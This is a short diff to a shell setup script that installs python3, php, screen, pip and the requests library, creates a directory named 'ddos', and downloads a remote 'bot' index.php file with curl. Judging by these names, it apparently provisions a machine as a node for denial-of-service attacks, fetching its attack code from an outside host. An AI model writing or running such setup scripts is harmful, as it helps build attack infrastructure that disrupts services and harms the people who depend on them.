@@ -1,7 +1,9 @@
 yum update -y
 yum install python3 -y
+yum install python3-pip -y
 yum install php -y
 yum install screen -y
+pip3 install requests
 mkdir ddos
 cd ddos
 curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/index.php -o index.php
